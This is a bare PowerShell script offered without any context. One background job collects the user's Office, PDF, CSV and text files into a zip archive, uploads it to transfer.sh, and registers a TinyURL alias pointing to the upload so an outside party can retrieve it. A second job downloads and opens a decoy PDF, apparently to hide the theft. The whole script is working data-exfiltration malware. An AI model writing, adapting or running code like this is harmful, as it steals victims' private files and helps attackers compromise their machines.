$a = Start-Job -ScriptBlock {$ALIAS="..........";
$files=Get-ChildItem "C:\Users\$env:UserName" -Include "*.ppt*","*.xls*","*.doc*","*.txt*","*.pdf","*.csv" -Recurse;
$zipFile = "C:\Users\$env:UserName\000.zip";
set-content $zipFile ("PK" + [char]5 + [char]6 + ("$([char]0)" * 18));
(dir $zipFile).IsReadOnly = $false;
$shellApplication = new-object -com shell.application;
$zipPackage = $shellApplication.NameSpace($zipFile);
mkdir C:\Users\$env:UserName\tmp0001;
copy-Item -Force $files -Destination C:\Users\$env:UserName\tmp0001;
$files = Get-ChildItem  C:\Users\$env:UserName\tmp0001;
foreach($file in $files) { $zipPackage.CopyHere($file.FullName, 0x10); while($zipPackage.Items().Item($file.name) -eq $null){ Start-sleep -m 50}};
Remove-Item -Recurse C:\Users\$env:UserName\tmp0001;
$client = (New-Object Net.WebClient);
$res = $client.UploadFile("https://transfer.sh/000.zip", 'PUT', "C:\Users\$env:UserName\000.zip");
$sub = [System.Text.Encoding]::ASCII.Getstring($res) | %{$_.split('/')[3]}
$wr = [System.Net.WebRequest]::Create("https://tinyurl.com/create.php");
$wr.Method = "POST" ;
$wr.ContentType = "application/x-www-form-urlencoded";
$body = "url=https://transfer.sh/$sub/000.zip&submit=Make+TinyURL/&alias=$ALIAS";
$content = [System.Text.Encoding]::UTF8.GetBytes($body);
$wr.ContentLength = $content.Length;
$reqS = $wr.GetRequestStream()
$reqS.Write($content, 0, $content.Length)
$reqS.close()
$res = $wr.GetResponse()
}
$b = Start-Job -ScriptBlock {$PDF="...............";
$client = (New-Object Net.WebClient);
$client.DownloadFile($PDF, "C:\Users\$env:UserName\0001.pdf");
start "C:\Users\$env:UserName\0001.pdf"
}
Wait-Job $a
Wait-Job $b
